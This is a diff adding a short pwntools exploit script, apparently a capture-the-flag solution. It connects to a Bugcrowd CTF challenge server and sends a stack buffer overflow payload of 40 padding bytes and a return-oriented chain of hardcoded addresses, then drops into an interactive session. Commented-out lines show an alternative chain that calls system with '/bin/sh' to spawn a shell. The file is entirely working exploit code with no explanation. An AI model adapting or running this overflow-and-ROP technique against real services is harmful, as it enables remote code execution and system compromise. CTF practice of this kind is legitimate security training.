@@ -1,0 +1,13 @@
+from pwn import *
+p=process('./chal')
+#exe=ELF('./chal',checksec=False)
+p=remote('challenges.bhusa.bugcrowdctf.com', 8084)
+payload=b'a'*40+p64(0x0000000000400953)+p64(0x400978)+p64(0x00000000004007f0)
+#input()
+p.sendline(payload)
+#input()
+#p.sendline(b'/bin/sh\x00')
+#payload=b'a'*40+p64(0x0000000000400953)+p64(0x0000000000601000)+p64(exe.plt['system'])
+#input()
+#p.sendline(payload)
+p.interactive()
